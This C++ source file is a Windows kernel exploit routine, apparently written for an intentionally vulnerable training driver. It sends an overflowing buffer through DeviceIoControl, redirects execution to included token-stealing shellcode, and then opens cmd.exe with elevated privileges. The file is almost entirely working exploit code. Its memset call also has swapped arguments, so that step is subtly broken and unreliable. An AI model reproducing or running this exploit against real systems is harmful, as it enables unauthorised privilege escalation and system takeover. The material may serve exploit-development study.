#include <Windows.h>
#include "Solutions.h"
#include "ioctal_codes.h"
#include "stdio.h"
#include "random_str.h"
#include "TokenStealingShellcode.h"

DWORD Solutions::TriggerIntegerOverflow() {
	DWORD dwBufSize = 0x828;
	DWORD lTerminatorValue = 0xBAD0B0B0;
	PUCHAR lpInBuffer = NULL;
	DWORD dwIoctl = IOCTL_INTEGER_OVERFLOW;
	DWORD dwBytesReturned = NULL;
	PVOID pEopPayload = &tokenStealingShellcode;

	lpInBuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufSize + sizeof(PULONG) * 2);
	if (!lpInBuffer) {
		wprintf(L"[-] Could not allocate buffer :(\n");
		return 1;
	}

	memset(lpInBuffer, dwBufSize, 0x41);
	*(PULONG)(lpInBuffer + dwBufSize) = (ULONG)pEopPayload;
	*(PULONG)(lpInBuffer + dwBufSize + 4) = lTerminatorValue;

	wprintf(L"[+] Prepering to jump to shellcode - 0x%x\n", (ULONG)pEopPayload);

	if (!DeviceIoControl(_hDeviceHandle, dwIoctl, (LPVOID)lpInBuffer, 0xffffffff,
		NULL, NULL, &dwBytesReturned, NULL)) {
		wprintf(L"[-] Could not talk with the driver :(\n");
		HeapFree(GetProcessHeap(), NULL, lpInBuffer);
		return 1;
	}

	wprintf(L"[+] Succesfully talked with the driver\n");

	system("cmd.exe");

	return 0;
}

